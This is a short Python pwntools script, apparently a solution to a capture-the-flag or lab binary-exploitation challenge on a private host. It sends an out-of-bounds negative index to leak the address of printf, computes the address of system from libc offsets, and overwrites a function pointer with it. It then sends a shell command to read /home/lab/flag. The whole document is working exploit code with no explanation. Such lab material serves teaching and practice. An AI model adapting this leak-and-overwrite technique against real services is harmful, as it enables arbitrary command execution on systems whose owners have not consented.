from pwn import *
r = remote('10.113.184.121', 10043)
r.recvuntil(b'idx: ')
index = (0x4020 - 0x4048) // 0x8
r.sendline(str(index).encode())
printf_offset = int(r.recvline().split(b' = ')[1].split(b'\n')[0])
print(hex(printf_offset))
r.recvuntil(b'val: ')
system_offset = printf_offset - 0x606f0 + 0x50d70
r.sendline(str(system_offset).encode())
r.sendline(b'cat /home/lab/flag')
print(r.recv())
r.close()